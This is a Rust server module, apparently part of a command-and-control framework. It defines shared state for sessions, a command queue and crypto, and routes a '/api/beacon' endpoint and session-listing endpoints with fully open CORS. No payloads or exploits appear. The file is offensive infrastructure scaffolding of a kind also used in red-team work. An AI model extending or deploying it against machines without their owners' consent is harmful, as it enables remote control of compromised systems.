//! Server Module
//! Main server implementation

use crate::{handlers, session::SessionManager};
use crate::command::CommandQueue;
use std::{net::SocketAddr, sync::Arc};
use axum::{Router, routing::post};
use tower_http::cors::{Any, CorsLayer};
use anyhow::Result;

#[derive(Clone)]
pub struct ServerState {
    pub sessions: SessionManager,
    pub commands: CommandQueue,
    pub secret: String,
    pub crypto: crate::crypto::ServerCrypto,
}

pub struct Server {
    state: Arc<ServerState>
}

impl Server {
    pub fn new(sessions: SessionManager, commands: CommandQueue, secret: String) -> Self {  /* -> This will also take the sessions and commandq */
        let crypto = crate::crypto::ServerCrypto::new(&secret);
        Self {
            state: Arc::new(
                ServerState { 
                    sessions,
                    commands,
                    secret,
                    crypto
                }
            )
        }
    }

    pub async fn run(self, addr: SocketAddr) -> Result<()> {
        let app = self.router();
        log::info!("Server listening on http://{}", addr);
        let listener = tokio::net::TcpListener::bind(&addr).await?;
        axum::serve(listener, app.into_make_service()).await?;
        Ok(())
    }

    pub async fn run_tls(&self) -> Result<()> {
        println!("This function {{run_tls}} is'nt created");
        Ok(())
    }

    /// This function will build the router
    fn router(&self) -> Router {
        Router::new()
            // Mostly these will be the main beacon endpoints
            .route("/api/beacon", post(handlers::beacon::beacon))

            // Session managment endpints
            .route("/api/sessions", post(handlers::session::list_sessions))
            .route("/api/sessions/:id", post(handlers::session::get_session))
            .layer(CorsLayer::new()
                .allow_origin(Any)
                .allow_methods(Any)
                .allow_headers(Any)
            ).with_state(self.state.clone())
    } 
}

